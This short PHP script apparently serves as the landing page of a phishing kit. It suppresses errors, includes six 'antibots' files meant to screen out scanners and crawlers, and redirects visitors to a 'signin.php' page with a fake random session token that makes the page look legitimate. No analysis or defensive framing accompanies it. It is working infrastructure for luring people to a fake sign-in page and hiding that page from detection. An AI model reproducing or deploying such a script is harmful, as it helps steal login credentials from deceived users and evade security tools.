<?php
error_reporting(0);
include "../bot/antibots1.php";
include "../bot/antibots2.php";
include "../bot/antibots3.php";
include "../bot/antibots4.php";
include "../bot/antibots5.php";
include "../bot/antibots6.php";
header("location: signin.php?session=".substr(bin2hex(md5(rand(9999,99999999))), 0,12));
?>